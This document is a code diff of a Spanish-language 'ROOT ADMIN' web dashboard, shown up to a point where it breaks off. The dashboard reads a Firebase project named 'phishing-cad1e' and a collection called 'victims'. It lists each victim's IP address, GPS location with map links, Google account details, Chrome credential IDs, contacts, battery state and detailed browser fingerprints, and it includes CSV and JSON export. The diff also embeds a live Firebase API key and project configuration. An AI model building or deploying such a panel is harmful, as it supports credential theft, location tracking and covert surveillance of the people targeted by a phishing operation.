@@ -3,543 +3,281 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>ROOT — Admin Panel</title>
+<title>ROOT ADMIN</title>
 <style>
-:root {
-  --bg:     #080808; --bg2: #0f0f0f; --bg3: #161616;
-  --border: #1e1e1e; --accent: #EE1D52; --accent2: #69C9D0;
-  --text:   #c8c8c8; --dim: #444;
-  --green:  #22c55e; --yellow: #eab308; --purple: #a855f7;
+:root{
+  --bg:#080808;--bg2:#0f0f0f;--bg3:#161616;--border:#1e1e1e;
+  --accent:#EE1D52;--a2:#69C9D0;--text:#c8c8c8;--dim:#555;
+  --green:#22c55e;--yellow:#eab308;--purple:#a855f7;
 }
-* { margin:0; padding:0; box-sizing:border-box; }
-body {
-  background:var(--bg); color:var(--text);
-  font-family:'Segoe UI',system-ui,sans-serif; font-size:0.88rem;
-  min-height:100vh; padding-bottom:env(safe-area-inset-bottom,0px);
-}
-header {
-  background:var(--bg2); border-bottom:1px solid var(--border);
-  padding:13px 20px; display:flex; align-items:center;
-  justify-content:space-between; position:sticky; top:0; z-index:100;
-}
-.logo-txt { font-size:1rem; font-weight:700; letter-spacing:2px; }
-.logo-txt span { color:var(--accent); }
-.status-dot {
-  width:8px; height:8px; border-radius:50%;
-  background:var(--dim); display:inline-block;
-  margin-right:6px; transition:background 0.3s;
-}
-.status-dot.live { background:var(--green); animation:pulse 1.5s infinite; }
-@keyframes pulse { 0%,100%{opacity:1}50%{opacity:0.4} }
-#status-txt { font-size:0.78rem; color:var(--dim); }
-
-/* STATS */
-#stats-bar {
-  display:flex; gap:1px; background:var(--border);
-  border-bottom:1px solid var(--border); overflow-x:auto;
-}
-.stat-cell {
-  flex:1; min-width:65px; background:var(--bg2);
-  padding:10px 8px; text-align:center;
-}
-.stat-cell .sv { font-size:1.3rem; font-weight:700; color:var(--accent); }
-.stat-cell .sl { font-size:0.58rem; color:var(--dim); text-transform:uppercase; letter-spacing:1px; margin-top:2px; }
-
-/* TOOLBAR */
-#toolbar {
-  padding:10px 16px; display:flex; gap:8px; flex-wrap:wrap;
-  border-bottom:1px solid var(--border); background:var(--bg2);
-}
-#search-bar {
-  flex:1; min-width:160px; background:var(--bg3); border:1px solid var(--border);
-  border-radius:7px; padding:8px 12px; color:var(--text);
-  font-size:0.84rem; outline:none;
-}
-#search-bar:focus { border-color:var(--accent2); }
-.tb-btn {
-  background:var(--bg3); border:1px solid var(--border);
-  color:var(--dim); padding:8px 12px; border-radius:7px;
-  font-size:0.74rem; cursor:pointer; transition:all 0.2s; white-space:nowrap;
-}
-.tb-btn:hover { border-color:var(--accent); color:var(--accent); }
-.tb-btn.on    { border-color:var(--accent2); color:var(--accent2); }
-
-/* MAIN */
-main { padding:14px 16px; }
-#entries { display:flex; flex-direction:column; gap:10px; }
-.empty-state {
-  text-align:center; color:var(--dim); padding:60px 20px;
-  font-size:0.82rem; line-height:2;
-}
-.spinner-lg {
-  width:34px; height:34px; border:3px solid var(--border);
-  border-top-color:var(--accent); border-radius:50%;
-  animation:spin 0.8s linear infinite; margin:0 auto 14px;
-}
-@keyframes spin { to{transform:rotate(360deg)} }
-
-/* CARD */
-.entry-card {
-  background:var(--bg2); border:1px solid var(--border);
-  border-radius:10px; overflow:hidden; transition:border-color 0.2s;
-}
-.entry-card.new-ping { animation:newping 0.7s ease; }
-@keyframes newping {
-  0%   { border-color:var(--accent); box-shadow:0 0 18px rgba(238,29,82,.35); }
-  100% { border-color:var(--border); box-shadow:none; }
-}
-.card-header {
-  display:flex; align-items:center; gap:8px;
-  padding:11px 14px; cursor:pointer; user-select:none;
-  background:var(--bg3); flex-wrap:wrap;
-}
-.card-header:hover { background:#1a1a1a; }
-.card-hash {
-  font-family:monospace; font-size:0.78rem; color:var(--accent);
-  background:rgba(238,29,82,.09); padding:2px 7px; border-radius:4px; flex-shrink:0;
-}
-.card-ip   { font-family:monospace; font-size:0.83rem; color:var(--accent2); font-weight:600; }
-.card-loc  { font-size:0.74rem; color:var(--dim); flex:1; min-width:60px; }
-.card-ts   { font-size:0.67rem; color:var(--dim); flex-shrink:0; white-space:nowrap; }
-.card-arr  { color:var(--dim); font-size:0.76rem; transition:transform .2s; flex-shrink:0; }
-.card-arr.open { transform:rotate(90deg); }
-.card-body { display:none; padding:14px; border-top:1px solid var(--border); }
-.card-body.open { display:block; }
-
-/* SECTIONS */
-.sec-title {
-  font-size:0.61rem; color:var(--dim); text-transform:uppercase;
-  letter-spacing:1.5px; margin:12px 0 7px;
-  border-bottom:1px solid var(--border); padding-bottom:4px;
-}
-.sec-title:first-child { margin-top:0; }
-.field-grid {
-  display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
-  gap:5px 14px;
-}
-.field-row { display:flex; flex-direction:column; padding:3px 0; }
-.f-lbl { font-size:0.59rem; color:#333; text-transform:uppercase; letter-spacing:.7px; }
-.f-val { font-size:0.79rem; color:#bbb; word-break:break-all; margin-top:2px; font-family:monospace; }
-.f-val.a  { color:var(--accent);  font-weight:600; }
-.f-val.a2 { color:var(--accent2); font-weight:600; }
-.f-val.g  { color:var(--green);   font-weight:600; }
-.f-val.y  { color:var(--yellow); }
-.f-val.p  { color:var(--purple); }
-.f-val.d  { color:var(--dim); }
-
-.map-link {
-  display:inline-flex; align-items:center; gap:5px;
-  background:var(--bg3); border:1px solid var(--border);
-  border-radius:6px; padding:6px 11px; color:var(--accent2);
-  font-size:0.76rem; text-decoration:none; margin-top:7px; transition:border-color .2s;
-}
-.map-link:hover { border-color:var(--accent2); }
-
-.card-actions { display:flex; gap:7px; margin-top:12px; flex-wrap:wrap; }
-.btn-sm {
-  background:var(--bg3); border:1px solid var(--border);
-  color:var(--dim); padding:6px 12px; border-radius:6px;
-  font-size:0.73rem; cursor:pointer; transition:all .2s;
-  text-decoration:none; display:inline-block;
-}
-.btn-sm:hover       { border-color:var(--accent);  color:var(--accent); }
-.btn-sm.a2:hover    { border-color:var(--accent2); color:var(--accent2); }
-.btn-sm.g:hover     { border-color:var(--green);   color:var(--green); }
-
-.badge {
-  display:inline-block; padding:1px 5px; border-radius:3px;
-  font-size:0.58rem; font-weight:600; letter-spacing:.4px;
-  text-transform:uppercase; margin-left:3px; vertical-align:middle;
-}
-.bg  { background:rgba(34,197,94,.12);  color:var(--green); }
-.bt  { background:rgba(105,201,208,.12);color:var(--accent2); }
-.bgps{ background:rgba(234,179,8,.12);  color:var(--yellow); }
-.bcr { background:rgba(168,85,247,.12); color:var(--purple); }
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:.875rem;min-height:100vh;}
+header{background:var(--bg2);border-bottom:1px solid var(--border);padding:13px 18px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;}
+.logo{font-size:.95rem;font-weight:700;letter-spacing:2px;}.logo span{color:var(--accent);}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--dim);display:inline-block;margin-right:6px;transition:background .3s;}
+.dot.live{background:var(--green);animation:pulse 1.5s infinite;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+#stxt{font-size:.76rem;color:var(--dim);}
+#stats{display:flex;gap:1px;background:var(--border);border-bottom:1px solid var(--border);overflow-x:auto;}
+.sc{flex:1;min-width:60px;background:var(--bg2);padding:10px 6px;text-align:center;}
+.sc .v{font-size:1.25rem;font-weight:700;color:var(--accent);}
+.sc .l{font-size:.57rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-top:2px;}
+#toolbar{padding:10px 14px;display:flex;gap:8px;flex-wrap:wrap;border-bottom:1px solid var(--border);background:var(--bg2);}
+#sb{flex:1;min-width:150px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:8px 12px;color:var(--text);font-size:.83rem;outline:none;}
+#sb:focus{border-color:var(--a2);}
+.tb{background:var(--bg3);border:1px solid var(--border);color:var(--dim);padding:8px 11px;border-radius:7px;font-size:.72rem;cursor:pointer;transition:all .2s;white-space:nowrap;}
+.tb:hover{border-color:var(--accent);color:var(--accent);}
+main{padding:13px 14px;}
+#entries{display:flex;flex-direction:column;gap:10px;}
+.empty{text-align:center;color:var(--dim);padding:60px 20px;font-size:.8rem;line-height:2.2;}
+.spin{width:34px;height:34px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 14px;}
+@keyframes sp{to{transform:rotate(360deg)}}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
+.card.ping{animation:ping .7s ease;}
+@keyframes ping{0%{border-color:var(--accent);box-shadow:0 0 18px rgba(238,29,82,.35);}100%{border-color:var(--border);box-shadow:none;}}
+.ch{display:flex;align-items:center;gap:8px;padding:11px 14px;cursor:pointer;user-select:none;background:var(--bg3);flex-wrap:wrap;}
+.ch:hover{background:#1a1a1a;}
+.chash{font-family:monospace;font-size:.77rem;color:var(--accent);background:rgba(238,29,82,.09);padding:2px 7px;border-radius:4px;flex-shrink:0;}
+.cip{font-family:monospace;font-size:.82rem;color:var(--a2);font-weight:600;}
+.cloc{font-size:.73rem;color:var(--dim);flex:1;min-width:50px;}
+.cts{font-size:.65rem;color:var(--dim);flex-shrink:0;white-space:nowrap;}
+.carr{color:var(--dim);font-size:.75rem;transition:transform .2s;flex-shrink:0;}
+.carr.o{transform:rotate(90deg);}
+.cb{display:none;padding:13px;border-top:1px solid var(--border);}
+.cb.o{display:block;}
+.st{font-size:.6rem;color:var(--dim);text-transform:uppercase;letter-spacing:1.5px;margin:12px 0 6px;border-bottom:1px solid var(--border);padding-bottom:4px;}
+.st:first-child{margin-top:0;}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(145px,1fr));gap:4px 12px;}
+.fr{display:flex;flex-direction:column;padding:3px 0;}
+.fl{font-size:.58rem;color:#2e2e2e;text-transform:uppercase;letter-spacing:.6px;}
+.fv{font-size:.78rem;color:#bbb;word-break:break-all;margin-top:2px;font-family:monospace;}
+.fv.a{color:var(--accent);font-weight:600;}
+.fv.a2{color:var(--a2);font-weight:600;}
+.fv.g{color:var(--green);font-weight:600;}
+.fv.y{color:var(--yellow);}
+.fv.p{color:var(--purple);}
+.fv.d{color:var(--dim);}
+.mlink{display:inline-flex;align-items:center;gap:5px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--a2);font-size:.75rem;text-decoration:none;margin-top:7px;}
+.mlink:hover{border-color:var(--a2);}
+.acts{display:flex;gap:7px;margin-top:11px;flex-wrap:wrap;}
+.btn{background:var(--bg3);border:1px solid var(--border);color:var(--dim);padding:6px 11px;border-radius:6px;font-size:.72rem;cursor:pointer;transition:all .2s;text-decoration:none;display:inline-block;}
+.btn:hover{border-color:var(--accent);color:var(--accent);}
+.badge{display:inline-block;padding:1px 5px;border-radius:3px;font-size:.57rem;font-weight:600;text-transform:uppercase;margin-left:3px;vertical-align:middle;}
+.bg{background:rgba(34,197,94,.12);color:var(--green);}
+.ba2{background:rgba(105,201,208,.12);color:var(--a2);}
+.by{background:rgba(234,179,8,.12);color:var(--yellow);}
+.bp{background:rgba(168,85,247,.12);color:var(--purple);}
 </style>
 </head>
 <body>
-
 <header>
-  <div class="logo-txt"><span>ROOT</span> ADMIN</div>
-  <div style="display:flex;align-items:center;gap:10px">
-    <span><span class="status-dot" id="dot"></span><span id="status-txt">conectando...</span></span>
-  </div>
+  <div class="logo"><span>ROOT</span> ADMIN</div>
+  <span><span class="dot" id="dot"></span><span id="stxt">conectando...</span></span>
 </header>
-
-<div id="stats-bar">
-  <div class="stat-cell"><div class="sv" id="s-total">0</div><div class="sl">Total</div></div>
-  <div class="stat-cell"><div class="sv" id="s-hoy">0</div><div class="sl">Hoy</div></div>
-  <div class="stat-cell"><div class="sv" id="s-google">0</div><div class="sl">Google</div></div>
-  <div class="stat-cell"><div class="sv" id="s-tel">0</div><div class="sl">Tel</div></div>
-  <div class="stat-cell"><div class="sv" id="s-gps">0</div><div class="sl">GPS</div></div>
-  <div class="stat-cell"><div class="sv" id="s-cred">0</div><div class="sl">Cred</div></div>
-  <div class="stat-cell"><div class="sv" id="s-paises">0</div><div class="sl">Países</div></div>
+<div id="stats">
+  <div class="sc"><div class="v" id="s0">0</div><div class="l">Total</div></div>
+  <div class="sc"><div class="v" id="s1">0</div><div class="l">Hoy</div></div>
+  <div class="sc"><div class="v" id="s2">0</div><div class="l">Google</div></div>
+  <div class="sc"><div class="v" id="s3">0</div><div class="l">GPS</div></div>
+  <div class="sc"><div class="v" id="s4">0</div><div class="l">Batería</div></div>
+  <div class="sc"><div class="v" id="s5">0</div><div class="l">Países</div></div>
 </div>
-
 <div id="toolbar">
-  <input id="search-bar" placeholder="🔍  IP, email, país, ciudad..." oninput="filterEntries()">
-  <button class="tb-btn" onclick="exportCSV()">⬇ CSV</button>
-  <button class="tb-btn" onclick="exportJSON()">⬇ JSON</button>
-  <button class="tb-btn on" id="btn-sort" onclick="toggleSort()">↓ Recientes</button>
-  <button class="tb-btn" onclick="poll(true)">↺ Refresh</button>
+  <input id="sb" placeholder="🔍  IP, email, país, hash..." oninput="fil()">
+  <button class="tb" onclick="xCSV()">⬇ CSV</button>
+  <button class="tb" onclick="xJSON()">⬇ JSON</button>
+  <button class="tb" id="bsort" onclick="tSort()">↓ Recientes</button>
 </div>
+<main><div id="entries"><div class="empty"><div class="spin"></div>Conectando con Firebase...</div></div></main>
 
-<main>
-  <div id="entries">
-    <div class="empty-state"><div class="spinner-lg"></div>Conectando con Firebase...</div>
-  </div>
-</main>
+<script type="module">
+import { initializeApp }     from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, collection, onSnapshot, deleteDoc, doc, query, orderBy }
+  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-<script>
-// ════════════════════════════════════════════
-// CONFIG
-// ════════════════════════════════════════════
-const FB_KEY  = "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0";
-const FB_PROJ = "phishing-cad1e";
-const FS      = `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents`;
+const app = initializeApp({
+  apiKey:            "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0",
+  authDomain:        "phishing-cad1e.firebaseapp.com",
+  projectId:         "phishing-cad1e",
+  storageBucket:     "phishing-cad1e.firebasestorage.app",
+  messagingSenderId: "48855278637",
+  appId:             "1:48855278637:web:cd6386bf2342f0b63344a4"
+});
+const db = getFirestore(app);
 
-let allEntries = [], sortDesc = true;
+let all = [], desc = true;
 
-window.addEventListener('load', () => {
-  poll();
-  setInterval(poll, 5000);
+// ── REALTIME LISTENER ─────────────────────────────────
+const q = query(collection(db,'victims'));
+onSnapshot(q, snap => {
+  all = snap.docs.map(d => ({ id: d.id, data: d.data() }));
+  sort();
+  render();
+  stats();
+  status('live — '+all.length+' entradas', true);
+}, err => {
+  status('error: '+err.message, false);
 });
 
-// ════════════════════════════════════════════
-// POLL
-// ════════════════════════════════════════════
-async function poll(manual = false) {
-  try {
-    const r = await fetch(`${FS}/victims?key=${FB_KEY}&pageSize=300`);
-    if (!r.ok) { setStatus('error: ' + r.status); return; }
-    const j = await r.json();
-
-    if (!j.documents || j.documents.length === 0) {
-      allEntries = [];
-      renderAll(); updateStats();
-      setStatus('live — 0 entradas');
-      return;
-    }
-
-    const prevLen = allEntries.length;
-
-    allEntries = j.documents.map(doc => ({
-      id:   doc.name.split('/').pop(),
-      data: parseDoc(doc.fields)
-    }));
-
-    // Ordenar por _ts (guardado como string, convertir a número)
-    allEntries.sort((a, b) => {
-      const ta = Number(a.data._ts) || 0;
-      const tb = Number(b.data._ts) || 0;
-      return sortDesc ? tb - ta : ta - tb;
-    });
-
-    renderAll();
-    updateStats();
-    setStatus('live — ' + allEntries.length + ' entradas');
-
-    if (!manual && prevLen > 0 && allEntries.length > prevLen) {
-      const c = document.querySelector('.entry-card');
-      if (c) { c.classList.add('new-ping'); setTimeout(() => c.classList.remove('new-ping'), 700); }
-    }
-  } catch(e) {
-    setStatus('error: ' + e.message);
-  }
+function status(msg, live){
+  document.getElementById('stxt').textContent = msg;
+  document.getElementById('dot').className = 'dot'+(live?' live':'');
 }
 
-// ════════════════════════════════════════════
-// PARSE — todo es stringValue ahora
-// ════════════════════════════════════════════
-function parseDoc(fields) {
-  if (!fields) return {};
-  const out = {};
-  for (const [k, v] of Object.entries(fields)) {
-    // soporta stringValue, integerValue, doubleValue, booleanValue
-    out[k] = v.stringValue  !== undefined ? v.stringValue  :
-             v.integerValue !== undefined ? v.integerValue :
-             v.doubleValue  !== undefined ? v.doubleValue  :
-             v.booleanValue !== undefined ? String(v.booleanValue) :
-             v.timestampValue !== undefined ? v.timestampValue : '';
-  }
-  return out;
-}
-
-// ════════════════════════════════════════════
-// STATUS
-// ════════════════════════════════════════════
-function setStatus(msg) {
-  document.getElementById('status-txt').textContent = msg;
-  document.getElementById('dot').className = msg.startsWith('live') ? 'status-dot live' : 'status-dot';
-}
-
-// ════════════════════════════════════════════
-// STATS
-// ════════════════════════════════════════════
-function updateStats() {
-  const today = new Date().toDateString();
-  const paises = new Set();
-  let hoy = 0, google = 0, tel = 0, gps = 0, cred = 0;
-
-  for (const { data: d } of allEntries) {
-    const ts = Number(d._ts);
-    if (ts && new Date(ts).toDateString() === today) hoy++;
-    if (ok(d.gEmail) || ok(d.google_email)) google++;
-    if (ok(d.contact_tel)) tel++;
-    if (ok(d.lat) || ok(d.gps_lat)) gps++;
-    if (ok(d.credId) || ok(d.saved_credential_id)) cred++;
-    const c = d.country || d.ip_country;
-    if (c && c !== '?' && c !== '') paises.add(c);
-  }
-  setv('s-total',  allEntries.length);
-  setv('s-hoy',    hoy);
-  setv('s-google', google);
-  setv('s-tel',    tel);
-  setv('s-gps',    gps);
-  setv('s-cred',   cred);
-  setv('s-paises', paises.size);
-}
-
-function ok(v)      { return v && v !== '?' && v !== '' && v !== 'n/a' && v !== 'null'; }
-function setv(id,v) { document.getElementById(id).textContent = v; }
-
-// ════════════════════════════════════════════
-// SORT
-// ════════════════════════════════════════════
-function toggleSort() {
-  sortDesc = !sortDesc;
-  document.getElementById('btn-sort').textContent = sortDesc ? '↓ Recientes' : '↑ Antiguos';
-  allEntries.sort((a, b) => {
-    const ta = Number(a.data._ts) || 0, tb = Number(b.data._ts) || 0;
-    return sortDesc ? tb - ta : ta - tb;
+function sort(){
+  all.sort((a,b)=>{
+    const ta=Number(a.data.ts||0), tb=Number(b.data.ts||0);
+    return desc ? tb-ta : ta-tb;
   });
-  renderAll();
 }
 
-// ════════════════════════════════════════════
-// FILTER
-// ════════════════════════════════════════════
-function filterEntries() {
-  renderAll(document.getElementById('search-bar').value.toLowerCase());
+// ── STATS ─────────────────────────────────────────────
+function stats(){
+  const today=new Date().toDateString();
+  const paises=new Set();
+  let hoy=0,g=0,gps=0,bat=0;
+  for(const {data:d} of all){
+    if(d.ts && new Date(Number(d.ts)).toDateString()===today) hoy++;
+    if(ok(d.gEmail)||ok(d.google_email)) g++;
+    if(ok(d.lat)||ok(d.gps_lat)) gps++;
+    if(ok(d.bat)) bat++;
+    const c=d.country||d.ip_country;
+    if(c&&c!=='') paises.add(c);
+  }
+  sv('s0',all.length); sv('s1',hoy); sv('s2',g);
+  sv('s3',gps); sv('s4',bat); sv('s5',paises.size);
 }
+function sv(id,v){ document.getElementById(id).textContent=v; }
+function ok(v){ return v&&v!==''&&v!=='n/a'&&v!=='null'&&v!=='undefined'; }
 
-// ════════════════════════════════════════════
-// RENDER
-// ════════════════════════════════════════════
-function renderAll(filter = '') {
-  const container = document.getElementById('entries');
-  const filtered = filter
-    ? allEntries.filter(({ data: d }) =>
-        Object.values(d).some(v => String(v).toLowerCase().includes(filter)))
-    : allEntries;
+// ── FILTER ────────────────────────────────────────────
+window.fil = () => render(document.getElementById('sb').value.toLowerCase());
 
-  if (filtered.length === 0) {
-    container.innerHTML = `<div class="empty-state">
-      ${filter
-        ? '🔍 Sin resultados para "' + filter + '"'
-        : '<div class="spinner-lg"></div>Esperando entradas...'}
-    </div>`;
+window.tSort = () => {
+  desc=!desc;
+  document.getElementById('bsort').textContent=desc?'↓ Recientes':'↑ Antiguos';
+  sort(); render();
+};
+
+// ── RENDER ────────────────────────────────────────────
+function render(f=''){
+  const box=document.getElementById('entries');
+  const list=f ? all.filter(({data:d})=>Object.values(d).some(v=>String(v).toLowerCase().includes(f))) : all;
+  if(!list.length){
+    box.innerHTML=`<div class="empty">${f?'Sin resultados para "'+f+'"':'<div class="spin"></div>Esperando entradas...'}</div>`;
     return;
   }
-  container.innerHTML = filtered.map(({ id, data: d }) => buildCard(id, d)).join('');
+  box.innerHTML=list.map(({id,data:d})=>card(id,d)).join('');
 }
 
-// ════════════════════════════════════════════
-// BUILD CARD
-// ════════════════════════════════════════════
-function buildCard(id, d) {
-  const ts      = Number(d._ts) ? new Date(Number(d._ts)).toLocaleString('es') : '?';
-  const ip      = d.ip || d.ip_public || d.ipLocal1 || '?';
-  const loc     = [d.city || d.ip_city, d.country || d.ip_country].filter(v => v && v !== '?').join(', ');
-  const hash    = d.hash || d.compositeHash || id.slice(0, 8);
-  const hasG    = ok(d.gEmail)  || ok(d.google_email);
-  const hasTel  = ok(d.contact_tel);
-  const hasGPS  = ok(d.lat)     || ok(d.gps_lat);
-  const hasCred = ok(d.credId)  || ok(d.saved_credential_id);
-  const gLat    = d.lat  || d.gps_lat  || '';
-  const gLon    = d.lon  || d.gps_lon  || '';
+// ── CARD ──────────────────────────────────────────────
+function card(id,d){
+  const ts  = ok(d.ts) ? new Date(Number(d.ts)).toLocaleString('es') : '?';
+  const ip  = d.ip||d.ipLocal1||'?';
+  const loc = [d.city,d.country].filter(v=>v&&v!=='').join(', ');
+  const hsh = d.hash||id.slice(0,8);
+  const hasG   = ok(d.gEmail)||ok(d.google_email);
+  const hasGPS = ok(d.lat)||ok(d.gps_lat);
+  const hasBat = ok(d.bat);
+  const hasCr  = ok(d.credId);
+  const lat = d.lat||d.gps_lat||''; const lon=d.lon||d.gps_lon||'';
 
-  const badges  = [
-    hasG    ? '<span class="badge bg">G</span>'    : '',
-    hasTel  ? '<span class="badge bt">📱</span>'  : '',
-    hasGPS  ? '<span class="badge bgps">GPS</span>': '',
-    hasCred ? '<span class="badge bcr">CRED</span>': '',
+  const badges=[
+    hasG   ?'<span class="badge bg">G</span>'   :'',
+    hasGPS ?'<span class="badge by">GPS</span>' :'',
+    hasCr  ?'<span class="badge bp">CR</span>'  :'',
+    hasBat ?'<span class="badge ba2">🔋</span>' :'',
   ].join('');
 
-  const gpsLink = (hasGPS && gLat && gLon)
-    ? `<a class="map-link" href="https://maps.google.com/?q=${gLat},${gLon}" target="_blank">
-         🗺 Mapa (${Number(gLat).toFixed(5)}, ${Number(gLon).toFixed(5)})
-       </a>` : '';
+  const gmap = hasGPS&&lat?`<a class="mlink" href="https://maps.google.com/?q=${lat},${lon}" target="_blank">🗺 Mapa (${Number(lat).toFixed(5)}, ${Number(lon).toFixed(5)})</a>`:'';
 
-  const R = (pairs) => pairs.map(([k, cls]) => {
-    const v = d[k];
-    const disp = ok(v) ? String(v).slice(0, 300) : '—';
-    return `<div class="field-row">
-      <span class="f-lbl">${k}</span>
-      <span class="f-val ${cls || ''}">${disp}</span>
-    </div>`;
+  const R=(pairs)=>pairs.map(([k,c])=>{
+    const v=d[k]; const dsp=ok(v)?String(v).slice(0,280):'—';
+    return `<div class="fr"><span class="fl">${k}</span><span class="fv ${c||''}">${dsp}</span></div>`;
   }).join('');
 
-  return `
-<div class="entry-card" id="card-${id}">
-  <div class="card-header" onclick="toggleCard('${id}')">
-    <span class="card-hash">${hash}</span>
-    <span class="card-ip">${ip}</span>
-    <span class="card-loc">${loc}${badges}</span>
-    <span class="card-ts">${ts}</span>
-    <span class="card-arr" id="arr-${id}">▶</span>
+  return `<div class="card" id="c-${id}">
+  <div class="ch" onclick="tog('${id}')">
+    <span class="chash">${hsh}</span>
+    <span class="cip">${ip}</span>
+    <span class="cloc">${loc}${badges}</span>
+    <span class="cts">${ts}</span>
+    <span class="carr" id="ar-${id}">▶</span>
   </div>
-  <div class="card-body" id="body-${id}">
-
-    <div class="sec-title">🌐 Red / IP</div>
-    <div class="field-grid">${R([
-      ['ip','a'],['ip_public','a'],['ipLocal1','a2'],['ipLocal2','a2'],['ipLocal3','a2'],
-      ['city',''],['country',''],['region',''],['org',''],
-      ['asn','d'],['postal','d'],['ipTZ','d'],['lat','d'],['lon','d'],
-    ])}</div>
-    ${gpsLink}
-
-    ${hasGPS ? `<div class="sec-title">📍 GPS Real</div><div class="field-grid">${R([
-      ['lat','g'],['lon','g'],['gps_lat','g'],['gps_lon','g'],
-      ['gps_accuracy',''],['gps_altitude',''],['gps_speed',''],['gps_heading',''],
-    ])}</div>` : ''}
-
-    ${hasG ? `<div class="sec-title">🔑 Cuenta Google</div><div class="field-grid">${R([
-      ['gEmail','a'],['google_email','a'],
-      ['gName',''],['google_name',''],
-      ['gHD',''],['gSub','d'],['gVerif',''],['gPicture','d'],['gPrompt','d'],
-    ])}</div>` : ''}
-
-    ${hasCred ? `<div class="sec-title">🗝 Credenciales Chrome</div><div class="field-grid">${R([
-      ['credId','p'],['credName',''],['credType','d'],
-    ])}</div>` : ''}
-
-    ${hasTel ? `<div class="sec-title">📱 Contacto</div><div class="field-grid">${R([
-      ['contact_tel','a2'],['contact_name',''],['contact_email',''],['contacts_status','d'],
-    ])}</div>` : ''}
-
-    <div class="sec-title">🖥 Dispositivo</div>
-    <div class="field-grid">${R([
-      ['ua','d'],['platform',''],['vendor',''],['screen',''],['avail','d'],
-      ['dpr',''],['innerW','d'],['innerH','d'],['orient',''],['depth','d'],
-      ['cores',''],['memory',''],['touch',''],
-      ['bat','y'],['batChg',''],['batChgT','d'],['batDisT','d'],
-      ['pdfViewer','d'],['plugins','d'],
-    ])}</div>
-
-    <div class="sec-title">🌍 Idioma / Zona</div>
-    <div class="field-grid">${R([
-      ['lang',''],['langs','d'],['tz',''],['tzOffset',''],['locale',''],['dateStr','d'],
-    ])}</div>
-
-    <div class="sec-title">⚙ Conectividad</div>
-    <div class="field-grid">${R([
-      ['connType',''],['connEff',''],['connDl',''],['connRtt',''],['connSave',''],
-      ['online',''],['stQuota',''],['stUsed',''],
-      ['sw','d'],['idb','d'],['bt',''],['usb',''],['nfc',''],
-      ['share',''],['vib',''],['clip','d'],['creds','d'],['contacts','d'],['notif','y'],
-    ])}</div>
-
-    <div class="sec-title">🎬 Codecs</div>
-    <div class="field-grid">${R([
-      ['h264',''],['vp9',''],['av1',''],['mp3',''],['aac',''],['ogg',''],
-    ])}</div>
-
-    <div class="sec-title">🎨 CSS features</div>
-    <div class="field-grid">${R([
-      ['dark',''],['reduceMot',''],['hdr',''],['ptrFine',''],['ptrCoarse',''],['hover',''],
-    ])}</div>
-
-    <div class="sec-title">🔬 Fingerprint</div>
-    <div class="field-grid">${R([
-      ['hash','a'],['canvas','d'],['audio','d'],
-      ['glUVendor',''],['glURenderer',''],['glVer','d'],['glSL','d'],['glMax','d'],['glExt','d'],
-      ['fonts','d'],['fontN',''],
-      ['wasm',''],['wasmSIMD',''],['wasmThreads',''],['webGPU',''],['webGL2',''],
-    ])}</div>
-
-    <div class="sec-title">🔗 Referencia</div>
-    <div class="field-grid">${R([
-      ['referer',''],['url','d'],['params','d'],['_ts','d'],['_exit','d'],
-    ])}</div>
-
-    <div class="card-actions">
-      <button class="btn-sm" onclick="copyJSON('${id}')">📋 JSON</button>
-      <button class="btn-sm a2" onclick="copyIP('${id}')">📌 IP</button>
-      ${hasGPS && gLat ? `<a class="btn-sm" style="text-decoration:none;color:var(--dim)" href="https://maps.google.com/?q=${gLat},${gLon}" target="_blank">🗺 Mapa</a>` : ''}
-      <button class="btn-sm" style="margin-left:auto" onclick="delEntry('${id}')">🗑</button>
+  <div class="cb" id="cb-${id}">
+    <div class="st">🌐 Red / IP</div>
+    <div class="grid">${R([['ip','a'],['ipLocal1','a2'],['ipLocal2','a2'],['ipLocal3','a2'],['city',''],['country',''],['region',''],['org',''],['asn','d'],['postal','d'],['ipTZ','d'],['lat','d'],['lon','d']])}</div>
+    ${gmap}
+    ${hasGPS?`<div class="st">📍 GPS</div><div class="grid">${R([['lat','g'],['lon','g'],['gps_lat','g'],['gps_lon','g'],['gps_accuracy',''],['gps_altitude',''],['gps_speed','']])}</div>`:''}
+    ${hasG?`<div class="st">🔑 Google</div><div class="grid">${R([['gEmail','a'],['gName',''],['gHD',''],['gSub','d'],['gVerif',''],['gPrompt','d']])}</div>`:''}
+    ${hasCr?`<div class="st">🗝 Credenciales</div><div class="grid">${R([['credId','p'],['credName',''],['credType','d']])}</div>`:''}
+    <div class="st">🖥 Dispositivo</div>
+    <div class="grid">${R([['ua','d'],['platform',''],['vendor',''],['screen',''],['dpr',''],['orient',''],['depth','d'],['cores',''],['memory',''],['touch',''],['innerW','d'],['innerH','d']])}</div>
+    ${hasBat?`<div class="st">🔋 Batería</div><div class="grid">${R([['bat','y'],['batChg',''],['batDisT','d']])}</div>`:''}
+    <div class="st">🌍 Idioma / Zona</div>
+    <div class="grid">${R([['lang',''],['langs','d'],['tz',''],['tzOffset',''],['locale',''],['dark','']])}</div>
+    <div class="st">⚙ Conectividad</div>
+    <div class="grid">${R([['connType',''],['connEff',''],['connDl',''],['connRtt',''],['online',''],['stQuota',''],['stUsed',''],['sw','d'],['bt',''],['nfc',''],['notif','y']])}</div>
+    <div class="st">🔬 Fingerprint</div>
